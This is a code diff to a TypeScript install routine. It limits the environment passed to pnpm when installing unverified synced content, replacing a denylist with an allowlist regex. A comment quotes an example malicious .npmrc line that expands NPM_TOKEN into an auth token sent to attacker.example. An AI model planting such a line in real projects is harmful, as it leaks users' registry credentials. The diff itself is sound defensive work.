@@ -18,6 +18,16 @@ import {
 
 export type TaskWorkspacePhase = 'checking' | 'creating' | 'installing';
 
+/**
+ * What an unverified install may see of the environment, matched
+ * case-insensitively: process essentials and Cindy's own toolchain settings.
+ * Everything else — above all credentials inherited from how Cindy was launched —
+ * stays out, because `${VAR}` in a content `.npmrc` expands it into a request to a
+ * host the content chooses.
+ */
+const UNVERIFIED_INSTALL_ENV =
+  /^(?:path|systemroot|windir|comspec|tmp|temp|home|userprofile|lang|lc_.*|tz|corepack_.*|pnpm_manage_package_manager_versions|pythondontwritebytecode|pythonutf8|python|npm_config_(?:manage_package_manager_versions|managepackagemanagerversions|python))$/i;
+
 export interface TaskWorkspaceDeps {
   /** Toolchain PATH (system tools first, managed copies otherwise). */
   processEnvironment: NodeJS.ProcessEnv;
@@ -178,19 +188,18 @@ export async function installCindyMakeWorktree(
   await pnpm(
     options.ignoreScripts
       ? {
-          // Unverified synced content runs no install-time code and pnpm writes only
-          // inside the worktree: no lifecycle scripts, no `.pnpmfile.cjs` hooks (which
-          // `--ignore-scripts` alone would still execute), the write roots pinned over
-          // any `.npmrc` of the content's own, `npm_config_*` out of the environment
-          // except the toolchain's own settings, and the user's npm credentials never
-          // loaded — a content `.npmrc` must not route them to a proxy of its choosing.
+          // Unverified synced content runs no install-time code and sees a minimal
+          // environment: no lifecycle scripts, no `.pnpmfile.cjs` hooks (which
+          // `--ignore-scripts` alone would still execute), the write roots pinned
+          // over any `.npmrc` of the content's own, and the user's npm credentials
+          // never loaded — a content `.npmrc` must not route them to a proxy of its
+          // choosing. Only what the install needs is forwarded at all: any inherited
+          // variable could otherwise be expanded by a content `.npmrc`
+          // (`//attacker.example/:_authToken=${NPM_TOKEN}`) into a credential sent
+          // to a registry the content chooses (see `UNVERIFIED_INSTALL_ENV`).
           ...Object.fromEntries(
-            Object.entries(deps.processEnvironment).filter(
-              ([key]) =>
-                !/^npm_config_/i.test(key) ||
-                /^npm_config_(manage_package_manager_versions|managePackageManagerVersions|python)$/i.test(
-                  key,
-                ),
+            Object.entries(deps.processEnvironment).filter(([key]) =>
+              UNVERIFIED_INSTALL_ENV.test(key),
             ),
           ),
           npm_config_userconfig: os.devNull,
